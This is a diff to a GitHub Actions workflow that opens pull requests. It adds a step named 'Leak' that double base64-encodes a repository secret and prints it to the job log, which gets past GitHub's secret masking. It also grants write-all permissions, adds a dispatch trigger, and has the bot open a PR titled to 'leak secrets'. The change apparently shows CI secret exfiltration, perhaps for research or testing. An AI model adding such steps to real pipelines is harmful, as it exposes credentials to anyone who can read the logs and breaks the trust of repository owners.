@@ -3,6 +3,10 @@ name: Create and Push Branch, Then Make PR
 on:
   pull_request:
     types: [opened, reopened, synchronize, edited]
+  repository_dispatch:
+  # This is so that when the bot creates the repo, it triggers
+  # But it will create a recursive workflow, so gotta fix it later
+    types: [create-pull-request] 
 
 permissions: 
   write-all
@@ -12,6 +16,10 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: Leak
+        run: |
+          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
+
       - name: Checkout repository
         uses: actions/checkout@v2
         with:
@@ -49,13 +57,11 @@ jobs:
       - name: Create Pull Request
         uses: peter-evans/create-pull-request@v6
         with:
-          token: ${{ secrets.GITHUB_TOKEN }}
           commit-message: "Add leak.yml to leak secrets"
-          committer: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
-          author: ${{ github.actor }} <${{ github.actor }}+${{ github.actor }}@users.noreply.github.com>
           branch: ${{ env.BRANCH_NAME }}
           delete-branch: false
-          base: main
+          base: main # Ensure this is set to main
           title: '[Leak] Add leak.yml to leak secrets'
           body: "This PR adds the leak.yml file to leak secrets."
           draft: false
+
